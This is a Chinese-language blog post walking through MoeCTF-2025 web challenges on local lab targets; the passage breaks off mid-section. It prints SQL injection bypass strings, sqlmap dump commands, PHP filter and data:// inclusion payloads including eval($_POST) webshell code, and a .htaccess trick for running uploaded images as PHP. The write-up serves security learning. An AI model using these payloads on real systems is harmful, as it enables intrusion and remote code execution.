@@ -1,0 +1,321 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>[赛题复现]MoeCTF-2025 | 拂云观 · legend1440</title><meta name="author" content="legend1440"><meta name="copyright" content="legend1440"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="之前复现过的这里就不重复复现了 [问题 1&#x2F;F12&#x2F;源码分析]第一章 神秘的手镯进入题目，要求输入密码  F12 查看网页源码，发现源代码地址  查看后发现检测验证写在了前端，且 flag 就写在了最下方 这里密码非常长，还不能复制，也提示了你题不是要你真正地输入密码 因为是前端检测，也做不到用 Burp 抓包来改输入的密码  键入 flag，我们进入下一题 [问题 2&amp;#x2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[赛题复现]MoeCTF-2025">
+<meta property="og:url" content="http://hnu-legend1440.com/2026/04/04/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0-MoeCTF-2025/index.html">
+<meta property="og:site_name" content="拂云观 · legend1440">
+<meta property="og:description" content="之前复现过的这里就不重复复现了 [问题 1&#x2F;F12&#x2F;源码分析]第一章 神秘的手镯进入题目，要求输入密码  F12 查看网页源码，发现源代码地址  查看后发现检测验证写在了前端，且 flag 就写在了最下方 这里密码非常长，还不能复制，也提示了你题不是要你真正地输入密码 因为是前端检测，也做不到用 Burp 抓包来改输入的密码  键入 flag，我们进入下一题 [问题 2&amp;#x2">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://hnu-legend1440.com/img/png040404.png">
+<meta property="article:published_time" content="2026-04-04T12:07:02.000Z">
+<meta property="article:modified_time" content="2026-04-04T12:09:21.609Z">
+<meta property="article:author" content="legend1440">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://hnu-legend1440.com/img/png040404.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[赛题复现]MoeCTF-2025",
+  "url": "http://hnu-legend1440.com/2026/04/04/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0-MoeCTF-2025/",
+  "image": "http://hnu-legend1440.com/img/png040404.png",
+  "datePublished": "2026-04-04T12:07:02.000Z",
+  "dateModified": "2026-04-04T12:09:21.609Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "legend1440",
+      "url": "http://hnu-legend1440.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/sign.ico"><link rel="canonical" href="http://hnu-legend1440.com/2026/04/04/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0-MoeCTF-2025/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: false,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '[赛题复现]MoeCTF-2025',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><!-- hexo injector head_end start --><link rel="stylesheet" href="/Blog-Like/style.css">
+<script src="/Blog-Like/Blog-Like.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 8.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://q.qlogo.cn/headimg_dl?dst_uin=1535548287&amp;spec=640&amp;img_type=jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">33</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/schedule/"><i class="fa-fw fa fa-skating"></i><span> 期末突击</span></a></div><div class="menus_item"><a class="site-page" href="/categories/training/"><i class="fa-fw fa fa-yin-yang"></i><span> 集训修行</span></a></div><div class="menus_item"><a class="site-page" href="/categories/WP/"><i class="fa-fw fa fa-feather"></i><span> 全面战场</span></a></div><div class="menus_item"><a class="site-page" href="/categories/puzzles/"><i class="fa-fw fa fa-spa"></i><span> 练习札记</span></a></div><div class="menus_item"><a class="site-page" href="/categories/server/"><i class="fa-fw fa fa-star"></i><span> 服务器风采</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/png040404.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">拂云观 · legend1440</span></a><a class="nav-page-title" href="/"><span class="site-name">[赛题复现]MoeCTF-2025</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/schedule/"><i class="fa-fw fa fa-skating"></i><span> 期末突击</span></a></div><div class="menus_item"><a class="site-page" href="/categories/training/"><i class="fa-fw fa fa-yin-yang"></i><span> 集训修行</span></a></div><div class="menus_item"><a class="site-page" href="/categories/WP/"><i class="fa-fw fa fa-feather"></i><span> 全面战场</span></a></div><div class="menus_item"><a class="site-page" href="/categories/puzzles/"><i class="fa-fw fa fa-spa"></i><span> 练习札记</span></a></div><div class="menus_item"><a class="site-page" href="/categories/server/"><i class="fa-fw fa fa-star"></i><span> 服务器风采</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">[赛题复现]MoeCTF-2025</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-04-04T12:07:02.000Z" title="发表于 2026-04-04 20:07:02">2026-04-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-04-04T12:09:21.609Z" title="更新于 2026-04-04 20:09:21">2026-04-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/puzzles/">-puzzles</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>之前复现过的这里就不重复复现了</p>
+<h2 id="问题-1-F12-源码分析-第一章-神秘的手镯"><a href="#问题-1-F12-源码分析-第一章-神秘的手镯" class="headerlink" title="[问题 1&#x2F;F12&#x2F;源码分析]第一章 神秘的手镯"></a>[问题 1&#x2F;F12&#x2F;源码分析]第一章 神秘的手镯</h2><p>进入题目，要求输入密码</p>
+<p><img src="/img/TyDebvpT1oHk8IxdRHScr8hznSp.png"></p>
+<p>F12 查看网页源码，发现源代码地址</p>
+<p><img src="/img/RrW8bU6vco7jXXxBV1hc6IVmn20.png"></p>
+<p>查看后发现检测验证写在了前端，且 flag 就写在了最下方</p>
+<p>这里密码非常长，还不能复制，也提示了你题不是要你真正地输入密码</p>
+<p>因为是前端检测，也做不到用 Burp 抓包来改输入的密码</p>
+<p><img src="/img/YhQKbvTTYoLst7xbzwScttnin4d.png"></p>
+<p>键入 flag，我们进入下一题</p>
+<h2 id="问题-2-抓包查响应头-第二章-初识金曦玄轨"><a href="#问题-2-抓包查响应头-第二章-初识金曦玄轨" class="headerlink" title="[问题 2&#x2F;抓包查响应头]第二章 初识金曦玄轨"></a>[问题 2&#x2F;抓包查响应头]第二章 初识金曦玄轨</h2><p>本题有 hint，抓包</p>
+<p><img src="/img/StTqbsdOUoz90exBQhEcP0FqnDe.png"></p>
+<p>用 Burp 直接抓进站的包</p>
+<p><img src="/img/TuTdbVR8ZoEpxexxcsxclleNn8c.png"></p>
+<p>似乎没看到，有了之前春秋杯冬赛的启示，看看响应头</p>
+<p>重放器中看到了路由</p>
+<p><img src="/img/E2OLbUYGDolqHbxEQ6sc1XHfnib.png"></p>
+<p>访问一下，回显了这个</p>
+<p><img src="/img/DzbvbI68po7aKexn6oacRYLCnZf.png"></p>
+<p>抓这个的包，查看响应头，即得 flag</p>
+<p><img src="/img/JfxrbMMN0o8NWExKfc4cL2ufnRh.png"></p>
+<h2 id="问题-3-简单-http-第三章-问剑石！篡天改命！"><a href="#问题-3-简单-http-第三章-问剑石！篡天改命！" class="headerlink" title="[问题 3&#x2F;简单 http]第三章 问剑石！篡天改命！"></a>[问题 3&#x2F;简单 http]第三章 问剑石！篡天改命！</h2><p>本题有 hint，猜测是修改 http 请求头</p>
+<p><img src="/img/MxVKbBOJeoPq8mxq2eWcUYMcnrf.png"></p>
+<p>抓包修改请求头即可</p>
+<p><img src="/img/CZwJbVtRNo7sVTxQebpcfpbYn8b.png"></p>
+<h2 id="问题-4-PUT-脚本-第四章-金曦破禁与七绝傀儡阵"><a href="#问题-4-PUT-脚本-第四章-金曦破禁与七绝傀儡阵" class="headerlink" title="[问题 4&#x2F;PUT 脚本]第四章 金曦破禁与七绝傀儡阵"></a>[问题 4&#x2F;PUT 脚本]第四章 金曦破禁与七绝傀儡阵</h2><p>本关前面的部分不赘述，按照题目要求配置 http 请求就行了，做过很多遍的知识点</p>
+<p>注意本地访问 X-Forwarded-For 和 Forwarded-For 都应该尝试</p>
+<p>还有就是 PUT 请求体脚本,hackbar 请求体有 bug 会发送失败</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标URL</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:15246/void_rebirth&quot;</span></span><br><span class="line"><span class="comment"># 请求体内容</span></span><br><span class="line">data = <span class="string">&quot;新生！&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 发送PUT请求，指定文本格式</span></span><br><span class="line">    response = requests.put(</span><br><span class="line">        url=url,</span><br><span class="line">        data=data,</span><br><span class="line">        headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/plain; charset=utf-8&quot;</span>&#125;</span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># 打印结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;响应内容: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;请求失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>所以我 flag 呢?</p>
+<p><img src="/img/GYuubZTlFo9NbUx78NscJgd3nOb.png"></p>
+<p>应该获得的玉简碎片: bW9lY3Rme0Mw 就是 flag 碎片了吧，这里就不交 flag 了</p>
+<h2 id="问题-5-SQL-万能密码-第六章-藏经禁制？玄机初探！"><a href="#问题-5-SQL-万能密码-第六章-藏经禁制？玄机初探！" class="headerlink" title="[问题 5&#x2F;SQL 万能密码]第六章 藏经禁制？玄机初探！"></a>[问题 5&#x2F;SQL 万能密码]第六章 藏经禁制？玄机初探！</h2><p>考过很多次的 SQL 登录界面，如果不给用户名，是弱口令的概率不大</p>
+<p>用万能密码 1’ or 1#</p>
+<p><img src="/img/BVs4bI8S9o7SiHxH7HOcXFrHneg.png"></p>
+<p>即得 flag</p>
+<p><img src="/img/ZUr8bX7SAoaLRPxdnA5cQhgjnPb.png"></p>
+<h2 id="问题-6-信息收集-MD5-弱比较-第七章-灵蛛探穴与阴阳双生符"><a href="#问题-6-信息收集-MD5-弱比较-第七章-灵蛛探穴与阴阳双生符" class="headerlink" title="[问题 6&#x2F;信息收集&#x2F;MD5 弱比较]第七章 灵蛛探穴与阴阳双生符"></a>[问题 6&#x2F;信息收集&#x2F;MD5 弱比较]第七章 灵蛛探穴与阴阳双生符</h2><p>根据提示访问 robots.txt，泄露路由&#x2F;flag.php</p>
+<p>这里补充一个 robots.txt 的知识点</p>
+<p>robots.txt 的作用是作为一个禁止爬虫等访问方式的协议，这属于协议，不是权限锁，类似“君子协定”。</p>
+<p>其可以让<strong>搜索引擎 &#x2F; 爬虫</strong>比如百度、Google 看到 <code>Disallow: /flag.php</code> 自觉停止访问</p>
+<p>但服务器并没有对其限制，因此浏览器可以随意访问此路由，且此路由通常含有敏感信息。</p>
+<p><img src="/img/WTxvbQURkoPDgmxMUYAcqm4knAg.png"></p>
+<p>访问后得到一个 md5 弱比较题目，出了很多次了</p>
+<p>用 <code>240610708 314282422</code></p>
+<p><img src="/img/NcQYbbaG7o4LzGx7YeecFjXVnNf.png"></p>
+<h2 id="问题-7-双变量-SQL-注入-sqlmap-第八章-天衍真言，星图显圣"><a href="#问题-7-双变量-SQL-注入-sqlmap-第八章-天衍真言，星图显圣" class="headerlink" title="[问题 7&#x2F;双变量 SQL 注入&#x2F;sqlmap]第八章 天衍真言，星图显圣"></a>[问题 7&#x2F;双变量 SQL 注入&#x2F;sqlmap]第八章 天衍真言，星图显圣</h2><p>看起来像 UNION 注入，直接 SQLmap 一把梭了</p>
+<p><img src="/img/YWIabv3D7ouXMwxPrircEN23nkf.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:46304?username=1&amp;password=1&quot;</span> -p password --batch</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:46304?username=1&amp;password=1&quot;</span> -p password --batch --current-db</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:46304?username=1&amp;password=1&quot;</span> -p password -D user --tables</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:46304?username=1&amp;password=1&quot;</span> -p password -D user -T flag --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/JBxtbiL20ofmxAxq4IYcKX5ZnTc.png"></p>
+<h3 id="做题启示"><a href="#做题启示" class="headerlink" title="做题启示"></a>做题启示</h3><p>巧妙运用 sqlmap 这一扫描工具，注意双变量时的处理手法</p>
+<h2 id="问题-8-RCE-命令拼接-第九章-星墟禁制·天机问路"><a href="#问题-8-RCE-命令拼接-第九章-星墟禁制·天机问路" class="headerlink" title="[问题 8&#x2F;RCE&#x2F;命令拼接]第九章 星墟禁制·天机问路"></a>[问题 8&#x2F;RCE&#x2F;命令拼接]第九章 星墟禁制·天机问路</h2><p>这很明显是命令拼接了，查看环境变量</p>
+<p><img src="/img/PrHTbRwyZoXpawxxoURcmZ42n1c.png"></p>
+<h2 id="问题-9-Burp-爆破-编码文件包含-第十一章-千机变·破妄之眼"><a href="#问题-9-Burp-爆破-编码文件包含-第十一章-千机变·破妄之眼" class="headerlink" title="[问题 9&#x2F;Burp 爆破&#x2F;编码文件包含]第十一章 千机变·破妄之眼"></a>[问题 9&#x2F;Burp 爆破&#x2F;编码文件包含]第十一章 千机变·破妄之眼</h2><p><strong>题目 hint:<strong>HDdss 看到了 <strong>GET</strong>  参数名由 <code>m,n,o,p,q</code> 这五个字母组成（每个字母出现且仅出现一次），长度正好为 5，虽然不清楚字母的具体顺序，但是他知道</strong>参数名等于参数值</strong>才能进入。</p>
+<p>参数名&#x3D;参数值，这里使用 Burp 爆破五个字母的组合，值得一提的是用了 intruder 新的方式–撞击物</p>
+<p><img src="/img/FokubdtvmovHjPx5dRwchyjQnhc.png"></p>
+<p>payload 配置中我们选择[爆破]，字符集输入 mnopq，长度设为 5，点击开始攻击</p>
+<p><img src="/img/FS72bcaQloeSKWxlxgkclcHDn2A.png"></p>
+<p>观察不同的响应，随后在响应中发现正确的路由(我这 Burp 抽风了，真奇怪，第一次做还有用，这里并没展示出扫描的内容)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">302</span> Found</span><br><span class="line">Location: find.php</span><br></pre></td></tr></table></figure>
+
+<p>访问 find.php，是个文件包含，但是看不到 flag 内容</p>
+<p><img src="/img/Dw3HbEfwoozZY4xNlwuczBnGnSc.png"></p>
+<p>我们很容易想到用文件包含 file 协议，但很明显，这需要知道绝对路径，为方便我们更换 PHP 协议 + 编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCmVjaG8gImZsYWflsLHlnKjov5nkuobvvIznnIvkuI3liLDlkJfvvIzmmK/ogIHlvJ/looPnlYzkuI3lpJ/lkKciOw0KLy9tb2VjdGZ7ODM1ZTFlYWYtZTBkOC0zYWJjLTQ5NjYtMWM4MjMwOTE1M2NhfQ==</span><br></pre></td></tr></table></figure>
+
+<p>解码即得 flag</p>
+<p><img src="/img/Jx9obQ4atoHx0SxSmCKc6FHvngc.png"></p>
+<h3 id="做题启示-1"><a href="#做题启示-1" class="headerlink" title="做题启示"></a>做题启示</h3><p>我们可以分析一下，为什么读不出来</p>
+<p>这肯定是因为这个文件包含的程序用的是 include 直接运行了，解决这个问题的方法就是使用编码器</p>
+<p>并且这样读也是没有用的</p>
+<p><img src="/img/EicubRzlLo6IhUxHM3AcWSnYntc.png"></p>
+<h2 id="问题-10-蚁剑-第十二章-玉魄玄关·破妄"><a href="#问题-10-蚁剑-第十二章-玉魄玄关·破妄" class="headerlink" title="[问题 10&#x2F;蚁剑]第十二章 玉魄玄关·破妄"></a>[问题 10&#x2F;蚁剑]第十二章 玉魄玄关·破妄</h2><p>使用蚁剑连接，这里就不多说了</p>
+<p><img src="/img/HlFGbG9Y1oFBdTxHnmNcanhTnNH.png"></p>
+<p>flag 在环境变量中</p>
+<h3 id="关于环境变量"><a href="#关于环境变量" class="headerlink" title="关于环境变量"></a>关于环境变量</h3><p>输入 PHPinfo();也能看到环境变量，可以用 F12 查看器查找</p>
+<p><img src="/img/Wpa4by5w1oW4cVx9OvncSwstnOg.png"></p>
+<h2 id="问题-11-文件上传-绕过头检验-第十三章-通幽关·灵纹诡影"><a href="#问题-11-文件上传-绕过头检验-第十三章-通幽关·灵纹诡影" class="headerlink" title="[问题 11&#x2F;文件上传&#x2F;绕过头检验]第十三章 通幽关·灵纹诡影"></a>[问题 11&#x2F;文件上传&#x2F;绕过头检验]第十三章 通幽关·灵纹诡影</h2><p>文件上传，绕过 16 进制头检验</p>
+<p><img src="/img/ZgnBbZz1CoWUTSxW08lcCxcEnOb.png"></p>
+<p>有上面这么几个文件上传的要求吧，我们随便找一张比较小的图就行了，上面要 jpg 我们就拿一个小的 jpg 试试，但 16 进制检验要的是 FF 08 FF，还得用编辑器把前六个字母改好，这里可以用十六进制替换，因为正常 16 进制编辑好像找不到在哪编辑</p>
+<p><img src="/img/Nq5FbAxHnoGJE9xCMuDcr63Tn1b.png"></p>
+<p>底下就直接右边嵌入 shell</p>
+<p><img src="/img/Jc62bOlo9o7sRzxP42qcRRb4n0d.png"></p>
+<p>jpg 文件上传后只给了个地址去访问，访问是解析不了图片马的</p>
+<p>于是思考到扩展名是建议不是必须，改成 php，竟然通过了检测，下面的 flag 显示说明拿到了 webshell，这是我写好的一个 echo 标记</p>
+<p><img src="/img/Oi8xbXQ5qotoJ3xJVw7c5W0Jnzh.png"></p>
+<p>用蚁剑连接，输入密码为 mima 即可</p>
+<p><img src="/img/UTn6bjqAOocXyzx5krqcHQhZnXc.png"></p>
+<p>flag 在根目录下</p>
+<p><img src="/img/EGqXb4MHgoPLuOx9m2Qc9OJvncf.png"></p>
+<h3 id="做题启示-2"><a href="#做题启示-2" class="headerlink" title="做题启示"></a>做题启示</h3><p>复习了一下文件头其实就是 16 进制编辑的前三位，然后用 16 进制替换就能改了，很简单</p>
+<h2 id="问题-12-文件上传-htaccess-问题-第十四章-御神关·补天玉碑"><a href="#问题-12-文件上传-htaccess-问题-第十四章-御神关·补天玉碑" class="headerlink" title="[问题 12&#x2F;文件上传&#x2F;.htaccess 问题]第十四章 御神关·补天玉碑"></a>[问题 12&#x2F;文件上传&#x2F;<code>.htaccess</code> 问题]第十四章 御神关·补天玉碑</h2><p>一个新的文件上传，看样子是黑名单检测</p>
+<p><img src="/img/JoAsbTrmaoVyjfxUaLUcHvfPnRf.png"></p>
+<p>使用大小写绕过，失败，遂利用.htaccess</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+
+<p>传.htaccess，提示成功</p>
+<p>随后传携带 shell 的.jpg 文件，访问后成功拿到 webshell</p>
+<p><img src="/img/CkkPbOcnyo20lWxXqxgccEUOnnL.png"></p>
+<h2 id="问题-13-文件上传-条件竞争-第十五章-归真关·竞时净魔"><a href="#问题-13-文件上传-条件竞争-第十五章-归真关·竞时净魔" class="headerlink" title="[问题 13&#x2F;文件上传&#x2F;条件竞争]第十五章 归真关·竞时净魔"></a>[问题 13&#x2F;文件上传&#x2F;条件竞争]第十五章 归真关·竞时净魔</h2><p>这次，很明显是白名单问题</p>
+<p>还有一条 hint:图片上传至&#x2F;uploads</p>
+<p><img src="/img/LcdrbkdxEolQOqxygbXclHjFnPe.png"></p>
+<p>00 截断失败了</p>
+<p>看了看攻略，是使用条件竞争，但靶场好像有流量限制，Burp 根本爆破不动，先撤了</p>
+<p>加一个爆破方法吧</p>
+<p><img src="/img/JcPnbTJfpocOjWxVhFXcMJEKnth.png"></p>
+<h2 id="问题-14-文件包含-data-协议"><a href="#问题-14-文件包含-data-协议" class="headerlink" title="[问题 14&#x2F;文件包含 data 协议]"></a>[问题 14&#x2F;文件包含 data 协议]</h2><p>在完成本题前，我们先来复习一下 data 协议</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">data 协议 — (» RFC 2397) 数据流封装器(https://www.php.net/manual/zh/wrappers.data.php),更像是给了你另外一次输入机会</span><br><span class="line"></span><br><span class="line">如果传入的数据是PHP代码，就会执行代码：</span><br><span class="line">data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">data://text/plain,&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;helloctf&#x27;</span>]);?&gt;</span><br><span class="line"></span><br><span class="line">data://text/plain;<span class="built_in">base64</span>,PD9waHAgcGhwaW5mbygpOz8+</span><br><span class="line">data://text/plain;<span class="built_in">base64</span>,PD9waHAgZXZhbCgkX1BPU1RbJ2hlbGxvY3RmJ10pOz8+</span><br><span class="line"></span><br><span class="line">or data:text/plain</span><br><span class="line"></span><br><span class="line">依赖：</span><br><span class="line">allow_url_fopen:On;</span><br><span class="line">allow_url_include:On;</span><br><span class="line">PHP_Version&gt;=5.2.0</span><br></pre></td></tr></table></figure>
+
+<p>data 协议的依赖环境十分苛刻，但这题的文件后缀无论如何都会被加上一个.php，似乎什么文件也包含不了，可以考虑 data 协议，这是本题代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line"></span><br><span class="line">include($_GET[&#x27;file&#x27;] . &quot;.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>使用</p>
